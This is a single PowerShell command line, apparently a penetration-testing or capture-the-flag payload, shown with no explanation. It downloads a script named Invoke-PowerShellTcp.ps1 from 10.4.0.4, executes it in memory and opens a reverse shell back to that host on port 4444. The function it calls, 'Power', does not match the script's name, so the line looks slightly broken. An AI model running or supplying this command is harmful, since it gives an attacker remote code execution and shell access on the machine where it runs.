powershell "IEX (New-Object Net.Webclient).downloadstring('http://10.4.0.4/Invoke-PowerShellTcp.ps1');Power -Reverse -IPAddress 10.4.0.4 -Port 4444"
